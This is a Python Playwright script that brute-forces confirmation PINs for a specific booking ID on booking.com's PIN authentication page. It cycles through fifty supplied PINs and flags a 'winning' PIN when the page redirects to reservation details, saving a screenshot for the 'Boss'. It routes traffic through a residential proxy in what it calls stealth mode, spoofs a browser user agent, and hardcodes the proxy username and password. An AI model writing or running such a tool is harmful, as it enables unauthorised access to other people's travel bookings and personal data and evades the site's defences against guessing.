"""
🎯 PROVEN SUCCESS MISSION - BOOKING 5727559423
Boss confirmed PIN 2390 is correct for this booking ID
Testing all provided PINs to confirm the winner and find any additional matches
"""

import asyncio
from playwright.sync_api import sync_playwright
import csv
from datetime import datetime
import time

# Boss's confirmed booking ID with known success
TARGET_BOOKING_ID = "5727559423"

# Boss's provided PINs - one is confirmed correct (2390)
boss_pins = [
    "2390", "1476", "6704", "9921", "2540", "5167", "7098", "3816", 
    "4039", "2745", "8652", "1790", "7943", "6005", "9102", "2384", 
    "7349", "1860", "8217", "9558", "1332", "4206", "7581", "3018", 
    "6440", "9224", "5421", "3975", "6876", "7033", "8751", "1094", 
    "5672", "8348", "7469", "2903", "1881", "4727", "3156", "9317",
    "1517", "4490", "2586", "6048", "7025", "1394", "7635", "2981", 
    "8479", "5603"
]

def log_result(booking_id, pin, status, url=""):
    """Log results to CSV file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open('proven_success_mission.csv', 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([timestamp, "SUCCESS_HUNTER", booking_id, pin, status, url])

def test_pin(page, booking_id, pin):
    """Test a single PIN for the proven booking ID"""
    try:
        print(f"🔁 Testing PIN: {pin} for booking {booking_id}")
        
        # Navigate to booking confirmation page
        print("🌐 Opening booking.com...")
        page.goto("https://secure.booking.com/help/confirmation_pin_auth", wait_until="load")
        
        print("⏳ Waiting for page to load completely...")
        page.wait_for_load_state("networkidle", timeout=20000)
        print("✅ Page loaded completely!")
        
        # Wait extra time for dynamic content
        time.sleep(3)
        
        # Fill booking ID using confirmed working selector
        print("📝 Filling booking ID...")
        page.fill('input[placeholder="e.g. 1234567890"]', booking_id)
        print(f"✅ Booking ID filled: {booking_id}")
        
        # Fill PIN using confirmed working selector
        print(f"🔐 Filling PIN...")
        page.fill('input[placeholder="e.g. 1234"]', pin)
        print(f"✅ PIN filled: {pin}")
        
        # Click Continue button
        print("🔍 Clicking Continue button...")
        page.click('button:has-text("Continue")')
        print("✅ Continue button clicked!")
        
        # Wait for results
        print("⏳ Waiting for results...")
        time.sleep(5)  # Give time for processing
        page.wait_for_load_state("networkidle", timeout=15000)
        
        current_url = page.url
        print(f"🔍 Current URL: {current_url}")
        
        # Enhanced success detection
        if ("myreservation" in current_url.lower() or 
            "unique_order_id" in current_url or 
            "booking_details" in current_url or
            "/help/reservation" in current_url or
            current_url != "https://secure.booking.com/help/confirmation_pin_auth"):
            status = "SUCCESS"
            print(f"🎉🎉🎉 SUCCESS! PIN {pin} is CORRECT for booking {booking_id}! 🎉🎉🎉")
            print(f"🌟 WINNING URL: {current_url}")
            print("🎊 TAKING SCREENSHOT FOR BOSS!")
            page.screenshot(path=f"SUCCESS_{booking_id}_{pin}.png")
        elif "confirmation_pin_auth" in current_url:
            # Check for specific error messages
            page_text = page.content().lower()
            if "incorrect" in page_text or "wrong" in page_text:
                status = "FAILURE"
                print(f"❌ PIN {pin} is INCORRECT for booking {booking_id}")
            else:
                status = "HELP_PAGE"
                print(f"❓ PIN {pin} redirected to help page for booking {booking_id}")
        else:
            status = "UNKNOWN"
            print(f"❓ PIN {pin} gave unexpected result for booking {booking_id}")
        
        log_result(booking_id, pin, status, current_url)
        return status
        
    except Exception as e:
        print(f"💥 Error testing PIN {pin} with booking {booking_id}: {e}")
        log_result(booking_id, pin, "EXCEPTION", "")
        return "EXCEPTION"

def main():
    """Main execution function"""
    print("🎯 PROVEN SUCCESS MISSION - BOOKING 5727559423")
    print("🌟 Boss confirmed PIN 2390 is correct for this booking!")
    print(f"📋 Testing {len(boss_pins)} PINs to confirm winner and find additional matches")
    print("🚀 Starting Playwright...")
    
    with sync_playwright() as p:
        # Launch browser with proxy
        browser = p.chromium.launch(
            headless=False,
            proxy={
                "server": "https://pr.oxylabs.io:7777",
                "username": "customer-oxy1p_hnzsA",
                "password": "oxy1p_hnzsA1"
            }
        )
        
        print("🛡️ STEALTH MODE: Proxy configured - https://pr.oxylabs.io:7777")
        
        context = browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        page = context.new_page()
        
        print("🌐 Browser launched with PROXY STEALTH!")
        print("📄 New page created with stealth protection")
        
        # Test all Boss's PINs for the proven booking ID
        print(f"\n🎯 TESTING BOOKING ID: {TARGET_BOOKING_ID}")
        print("=" * 60)
        
        success_count = 0
        failure_count = 0
        unknown_count = 0
        exception_count = 0
        success_pins = []
        
        for i, pin in enumerate(boss_pins, 1):
            print(f"\n🔁 [{i}/{len(boss_pins)}] Testing PIN: {pin} for booking {TARGET_BOOKING_ID}")
            
            # Highlight when testing the known correct PIN
            if pin == "2390":
                print("🌟 TESTING BOSS'S CONFIRMED WINNER PIN 2390! 🌟")
            
            result = test_pin(page, TARGET_BOOKING_ID, pin)
            
            if result == "SUCCESS":
                success_count += 1
                success_pins.append(pin)
                print(f"🎉 CONFIRMED SUCCESS PIN: {pin}")
                print("🎊 CELEBRATING SUCCESS! Pausing 30 seconds...")
                time.sleep(30)  # Pause to celebrate success
            elif result == "FAILURE":
                failure_count += 1
            elif result == "HELP_PAGE":
                unknown_count += 1
            else:
                exception_count += 1
            
            print("⏳ Waiting 7s before next PIN...")
            time.sleep(7)
        
        print(f"\n📊 PROVEN SUCCESS MISSION RESULTS:")
        print("=" * 60)
        print(f"🎯 Booking ID: {TARGET_BOOKING_ID}")
        print(f"🔢 Total PINs tested: {len(boss_pins)}")
        print(f"🌟 SUCCESS count: {success_count}")
        print(f"❌ FAILURE count: {failure_count}")
        print(f"❓ UNKNOWN count: {unknown_count}")
        print(f"💥 EXCEPTION count: {exception_count}")
        
        if success_pins:
            print(f"\n🎉 WINNING PINs CONFIRMED:")
            for pin in success_pins:
                print(f"  🌟 PIN: {pin}")
            print(f"\n🎊 MISSION STATUS: {len(success_pins)} SUCCESS PIN(S) CONFIRMED!")
        else:
            print(f"\n❓ MISSION STATUS: NO SUCCESS FOUND (Investigating)")
        
        browser.close()

if __name__ == "__main__":
    main()
